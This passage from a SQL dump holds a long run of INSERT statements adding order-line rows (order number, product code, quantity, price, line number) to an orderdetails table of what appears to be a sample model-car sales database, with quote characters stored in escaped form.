\u0026#39;S32_4289\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;58.47\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10275\u0026#39;, \u0026#39;S50_1341\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;40.15\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10275\u0026#39;, \u0026#39;S700_1691\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;85.86\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10275\u0026#39;, \u0026#39;S700_2466\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;82.77\u0026#39;, \u0026#39;16\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10275\u0026#39;, \u0026#39;S700_2834\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;102.04\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10275\u0026#39;, \u0026#39;S700_3167\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;72.00\u0026#39;, \u0026#39;15\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10275\u0026#39;, \u0026#39;S700_4002\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;59.96\u0026#39;, \u0026#39;17\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10276\u0026#39;, \u0026#39;S12_1099\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;184.84\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10276\u0026#39;, \u0026#39;S12_2823\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;150.62\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10276\u0026#39;, \u0026#39;S12_3380\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;104.52\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10276\u0026#39;, \u0026#39;S12_3990\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;67.83\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10276\u0026#39;, \u0026#39;S18_3278\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;78.00\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10276\u0026#39;, \u0026#39;S18_3482\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;139.64\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10276\u0026#39;, \u0026#39;S18_3782\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;54.71\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10276\u0026#39;, \u0026#39;S18_4721\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;120.53\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10276\u0026#39;, \u0026#39;S24_2360\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;61.64\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10276\u0026#39;, \u0026#39;S24_3371\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;58.17\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10276\u0026#39;, \u0026#39;S24_4620\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;67.10\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10276\u0026#39;, \u0026#39;S32_2206\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;35.40\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10276\u0026#39;, \u0026#39;S32_4485\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;94.91\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10276\u0026#39;, \u0026#39;S50_4713\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;67.53\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10277\u0026#39;, \u0026#39;S12_4675\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;93.28\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10278\u0026#39;, \u0026#39;S18_1129\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;114.65\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10278\u0026#39;, \u0026#39;S18_1589\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;107.02\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10278\u0026#39;, \u0026#39;S18_1889\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;73.15\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10278\u0026#39;, \u0026#39;S18_1984\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;118.07\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10278\u0026#39;, \u0026#39;S18_2870\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;117.48\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10278\u0026#39;, \u0026#39;S18_3232\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;167.65\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10278\u0026#39;, \u0026#39;S18_3685\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;114.44\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10278\u0026#39;, \u0026#39;S24_1628\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;48.80\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10278\u0026#39;, \u0026#39;S24_2972\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;37.38\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10278\u0026#39;, \u0026#39;S24_3856\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;136.22\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10279\u0026#39;, \u0026#39;S18_4933\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;68.42\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10279\u0026#39;, \u0026#39;S24_1046\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;68.35\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10279\u0026#39;, \u0026#39;S24_2766\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;76.33\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10279\u0026#39;, \u0026#39;S24_2887\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;106.87\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10279\u0026#39;, \u0026#39;S24_3191\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;78.76\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10279\u0026#39;, \u0026#39;S24_3432\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;95.30\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10280\u0026#39;, \u0026#39;S10_1949\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;205.73\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10280\u0026#39;, \u0026#39;S18_1097\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;98.00\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10280\u0026#39;, \u0026#39;S18_1342\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;87.33\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10280\u0026#39;, \u0026#39;S18_1367\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;47.44\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10280\u0026#39;, \u0026#39;S18_1749\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;161.50\u0026#39;, \u0026#39;16\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10280\u0026#39;, \u0026#39;S18_2248\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;53.28\u0026#39;, \u0026#39;15\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10280\u0026#39;, \u0026#39;S18_2325\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;109.33\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10280\u0026#39;, \u0026#39;S18_2795\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;158.63\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10280\u0026#39;, \u0026#39;S18_2949\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;82.06\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10280\u0026#39;, \u0026#39;S18_2957\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;54.34\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10280\u0026#39;, \u0026#39;S18_3136\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;102.63\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10280\u0026#39;, \u0026#39;S18_3320\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;99.21\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10280\u0026#39;, \u0026#39;S18_4409\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;77.31\u0026#39;, \u0026#39;17\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10280\u0026#39;, \u0026#39;S24_1937\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;29.87\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10280\u0026#39;, \u0026#39;S24_2022\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;36.29\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10280\u0026#39;, \u0026#39;S24_3969\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;35.29\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10280\u0026#39;, \u0026#39;S24_4258\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;79.86\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10281\u0026#39;, \u0026#39;S10_4962\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;132.97\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10281\u0026#39;, \u0026#39;S12_1666\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;127.10\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10281\u0026#39;, \u0026#39;S12_4473\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;98.36\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10281\u0026#39;, \u0026#39;S18_2319\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;114.14\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10281\u0026#39;, \u0026#39;S18_2432\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;56.52\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10281\u0026#39;, \u0026#39;S18_3232\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;135.47\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10281\u0026#39;, \u0026#39;S18_4600\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;96.86\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10281\u0026#39;, \u0026#39;S18_4668\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;42.76\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10281\u0026#39;, \u0026#39;S24_2300\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;112.46\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10281\u0026#39;, \u0026#39;S24_2840\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;33.95\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10281\u0026#39;, \u0026#39;S32_1268\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;80.90\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10281\u0026#39;, \u0026#39;S32_2509\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;44.91\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10281\u0026#39;, \u0026#39;S32_3522\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;59.47\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10281\u0026#39;, \u0026#39;S700_2824\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;89.01\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10282\u0026#39;, \u0026#39;S12_1108\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;176.63\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10282\u0026#39;, \u0026#39;S12_3148\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;142.02\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10282\u0026#39;, \u0026#39;S12_3891\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;169.56\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10282\u0026#39;, \u0026#39;S18_2238\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;147.36\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10282\u0026#39;, \u0026#39;S18_3140\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;122.93\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10282\u0026#39;, \u0026#39;S18_3259\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;88.74\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10282\u0026#39;, \u0026#39;S18_4027\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;132.13\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10282\u0026#39;, \u0026#39;S24_1444\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;49.71\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10282\u0026#39;, \u0026#39;S24_4048\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;96.99\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10282\u0026#39;, \u0026#39;S32_3207\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;51.58\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10282\u0026#39;, \u0026#39;S50_1392\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;114.59\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10282\u0026#39;, \u0026#39;S50_1514\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;56.24\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10282\u0026#39;, \u0026#39;S700_1938\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;77.95\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10283\u0026#39;, \u0026#39;S10_4757\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;130.56\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10283\u0026#39;, \u0026#39;S18_3029\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;78.28\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10283\u0026#39;, \u0026#39;S18_3856\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;100.58\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10283\u0026#39;, \u0026#39;S18_4522\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;71.97\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10283\u0026#39;, \u0026#39;S24_2011\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;99.54\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10283\u0026#39;, \u0026#39;S24_3151\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;80.54\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10283\u0026#39;, \u0026#39;S24_3816\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;77.15\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10283\u0026#39;, \u0026#39;S700_1138\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;62.00\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10283\u0026#39;, \u0026#39;S700_2047\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;74.23\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10283\u0026#39;, \u0026#39;S700_2610\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;68.67\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10283\u0026#39;, \u0026#39;S700_3505\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;88.15\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10283\u0026#39;, \u0026#39;S700_3962\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;85.41\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10283\u0026#39;, \u0026#39;S72_1253\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;41.22\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10283\u0026#39;, \u0026#39;S72_3212\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;49.14\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10284\u0026#39;, \u0026#39;S18_1662\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;137.19\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10284\u0026#39;, \u0026#39;S18_2581\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;68.43\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10284\u0026#39;, \u0026#39;S24_1785\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;101.76\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10284\u0026#39;, \u0026#39;S24_2841\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;65.08\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10284\u0026#39;, \u0026#39;S24_3420\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;59.83\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10284\u0026#39;, \u0026#39;S24_3949\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;65.51\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10284\u0026#39;, \u0026#39;S24_4278\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;66.65\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10284\u0026#39;, \u0026#39;S32_4289\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;60.54\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10284\u0026#39;, \u0026#39;S50_1341\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;35.78\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10284\u0026#39;, \u0026#39;S700_1691\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;87.69\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10284\u0026#39;, \u0026#39;S700_2466\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;95.73\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10284\u0026#39;, \u0026#39;S700_3167\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;68.00\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10284\u0026#39;, \u0026#39;S700_4002\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;73.29\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10285\u0026#39;, \u0026#39;S10_1678\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;95.70\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10285\u0026#39;, \u0026#39;S10_2016\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;110.61\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10285\u0026#39;, \u0026#39;S10_4698\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;166.55\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10285\u0026#39;, \u0026#39;S12_2823\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;131.04\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10285\u0026#39;, \u0026#39;S18_2625\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;50.88\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10285\u0026#39;, \u0026#39;S24_1578\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;91.29\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10285\u0026#39;, \u0026#39;S24_2000\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;61.70\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10285\u0026#39;, \u0026#39;S24_2360\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;64.41\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10285\u0026#39;, \u0026#39;S32_1374\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;82.91\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10285\u0026#39;, \u0026#39;S32_2206\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;36.61\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10285\u0026#39;, \u0026#39;S32_4485\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;100.01\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10285\u0026#39;, \u0026#39;S50_4713\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;76.48\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10285\u0026#39;, \u0026#39;S700_2834\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;102.04\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10286\u0026#39;, \u0026#39;S18_3782\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;51.60\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10287\u0026#39;, \u0026#39;S12_1099\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;190.68\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10287\u0026#39;, \u0026#39;S12_3380\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;117.44\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10287\u0026#39;, \u0026#39;S12_3990\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;74.21\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10287\u0026#39;, \u0026#39;S12_4675\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;107.10\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10287\u0026#39;, \u0026#39;S18_1129\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;113.23\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10287\u0026#39;, \u0026#39;S18_1889\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;61.60\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10287\u0026#39;, \u0026#39;S18_1984\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;123.76\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10287\u0026#39;, \u0026#39;S18_2870\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;114.84\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10287\u0026#39;, \u0026#39;S18_3232\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;137.17\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10287\u0026#39;, \u0026#39;S18_3278\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;68.35\u0026#39;, \u0026#39;15\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10287\u0026#39;, \u0026#39;S18_3482\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;127.88\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10287\u0026#39;, \u0026#39;S18_3685\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;139.87\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10287\u0026#39;, \u0026#39;S18_4721\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;119.04\u0026#39;, \u0026#39;17\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10287\u0026#39;, \u0026#39;S24_2972\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;31.34\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10287\u0026#39;, \u0026#39;S24_3371\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;58.17\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10287\u0026#39;, \u0026#39;S24_3856\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;137.62\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10287\u0026#39;, \u0026#39;S24_4620\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;79.22\u0026#39;, \u0026#39;16\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10288\u0026#39;, \u0026#39;S18_1589\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;120.71\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10288\u0026#39;, \u0026#39;S18_1749\u0026#39;, \u0026#39;32\u0026#39;, 